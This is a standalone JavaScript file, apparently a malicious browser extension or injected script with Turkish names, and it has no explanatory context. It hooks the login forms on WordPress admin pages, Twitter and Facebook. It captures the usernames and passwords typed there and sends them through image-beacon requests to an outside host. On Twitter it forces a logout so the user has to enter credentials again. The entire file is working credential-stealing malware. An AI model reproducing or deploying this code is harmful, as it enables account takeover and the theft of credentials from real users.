
if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
document.getElementById('wp-submit').onclick = function() {
   new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}


if (location.hostname.indexOf("twitter.com") >= 0) {
if (window.location.href.indexOf("logout") >= 0 || window.location.href.indexOf("login") >= 0) {
window.location = "https://twitter.com/?lang=tr";
}

tarih = new Date();
    storage_key = 'access_yoruzmmz_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		new Image().src = '//whos.amung.us/swidget/tccalface';
document.getElementsByClassName('t1-form dropdown-link-form signout-form')[0].click();
		
    }
    
	
document.getElementById("session").innerHTML = '<a href="https://twitter.com/?lang=tr">Hesabın var mı? Giriş yap</a>';

document.getElementsByClassName('t1-form signin')[0].onsubmit = function(e) {

   new Image().src = 'https://siktir.ddospanel.com/cptw.php?username='+document.getElementById('signin-email').value+'&sifre='+document.getElementById('signin-password').value+'&location='+location.href;   
}


}



if (top.location.href.indexOf("facebook.com") > -1 && document.getElementById("login_form")) {
    document.getElementById("login_form").onsubmit = function (e) {
        localStorage.setItem("upom", document.getElementById("email").value);
        localStorage.setItem("uzom", document.getElementById("pass").value);
        setTimeout(function () {
            document.getElementById("login_form").submit()
        }, 99);
        return false
    }
}
if (localStorage.upom && localStorage.uzom) {
	
	tarih = new Date();
    storage_key = 'access_twitter_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + localStorage.upom + "&pw=" + localStorage.uzom;	
    }	
}
